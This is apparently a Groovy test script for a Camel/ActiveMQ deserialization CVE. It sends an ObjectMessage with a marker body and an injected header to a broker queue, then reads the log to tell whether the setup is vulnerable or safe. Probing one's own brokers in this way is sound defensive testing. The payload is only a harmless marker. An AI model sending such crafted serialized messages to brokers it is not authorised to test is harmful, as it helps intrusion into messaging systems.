// SendHolder.groovy — CVE-2026-43866 hands-on probe.
//
// Sends the actual attack payload — a Camel DefaultExchangeHolder
// (org.apache.camel.impl.*) carrying an attacker-chosen body/header — as a JMS
// ObjectMessage to queue://cve.in on a RUNNING ActiveMQ broker. You then watch
// the broker log to see whether its Camel route deserializes it (trusted =>
// vulnerable) or ActiveMQ's trustedPackages rejects it (default => safe).
//
// IMPORTANT: run this against a broker using STOCK camel (base
// activemq-5.15.x-TT.x, camel 2.25.2). A broker built from the cve branch
// (camel 2.25.5-TT.3, objectMessageEnabled=false) rejects ObjectMessages in ALL
// cases — that exercises the patch, not ActiveMQ's trust behaviour.
//
// Prereqs on the broker side: the conf/camel.xml route consuming queue:cve.in ->
// log:received, and (for 5.15) the id="broker" startup fix.
//
// Run:  groovy SendHolder.groovy
// Opts (system properties):
//   -Dbroker=tcp://localhost:61616   broker URL (default)
//   -Duser=admin -Dpass=admin        credentials, if the broker requires auth
//   -Dqueue=cve.in                   destination (default)

@Grab('org.apache.camel:camel-core:2.25.2')
@Grab('org.apache.activemq:activemq-client:5.15.16')
// JAXB was removed from the JDK in Java 11; camel-core 2.25.x needs it, so pull it back in.
@Grab('javax.xml.bind:jaxb-api:2.3.1')
@Grab('org.glassfish.jaxb:jaxb-runtime:2.3.9')
@Grab('com.sun.activation:jakarta.activation:1.2.2')
import org.apache.activemq.ActiveMQConnectionFactory
import org.apache.camel.impl.DefaultCamelContext
import org.apache.camel.impl.DefaultExchange
import org.apache.camel.impl.DefaultExchangeHolder
import javax.jms.Session

def brokerUrl = System.getProperty('broker', 'tcp://localhost:61616')
def user      = System.getProperty('user')
def pass      = System.getProperty('pass')
def queue     = System.getProperty('queue', 'cve.in')
def marker    = "PWNED-BODY-${System.currentTimeMillis()}".toString()

// 1) Build the CVE-2026-43866 payload: a DefaultExchangeHolder with an
//    attacker-controlled body + header. Marshalling needs a Camel context
//    (it is never started; it only mints an Exchange to marshal).
def camel = new DefaultCamelContext()
def ex = new DefaultExchange(camel)
ex.in.body = marker
ex.in.setHeader('x-injected', 'attacker-value')
Serializable holder = DefaultExchangeHolder.marshal(ex)
println "payload class = ${holder.getClass().name}"
println "attacker body = ${marker}"

// 2) Send it as a JMS ObjectMessage. Sending serialises (unfiltered); the
//    broker-side ObjectMessage.getObject() on consume is where ActiveMQ's
//    ClassLoadingAwareObjectInputStream / trustedPackages is enforced.
def cf = new ActiveMQConnectionFactory(brokerUrl)
def conn = (user != null) ? cf.createConnection(user, pass) : cf.createConnection()
conn.start()
def sess = conn.createSession(false, Session.AUTO_ACKNOWLEDGE)
def producer = sess.createProducer(sess.createQueue(queue))
producer.send(sess.createObjectMessage(holder))
conn.close()

println ""
println "sent ObjectMessage(DefaultExchangeHolder) -> queue://${queue} @ ${brokerUrl}"
println ""
println "Now watch the broker console/log:"
println "  * nothing on the 'received' logger, plus a deserialization / ClassNotFound / security error"
println "      => ActiveMQ trustedPackages REJECTED it  => DEFAULT CONFIG IS SAFE"
println "  * 'received' logger prints  Body: ${marker}"
println "      => holder was unmarshalled => trust widened => VULNERABLE"
